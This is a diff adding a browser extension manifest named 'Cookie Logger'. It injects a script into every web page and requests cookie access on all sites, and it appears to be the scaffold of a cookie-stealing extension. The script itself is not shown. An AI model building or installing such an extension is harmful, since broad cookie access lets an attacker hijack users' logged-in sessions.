@@ -1,0 +1,23 @@
+﻿{
+  "name": "Cookie Logger",
+  "version": "1.0",
+  "manifest_version": 2,
+  "description": "By Localt",
+  "content_scripts": [
+    {
+      "matches": [
+        "http://*/*",
+        "https://*/*"
+      ],
+      "js": ["script.js"]
+    }
+  ],
+  "permissions": [
+    "cookies",
+    "http://*/*",
+    "https://*/*"
+  ],
+  "browser_action": {
+    "default_popup": "popup.html"
+  }
+}
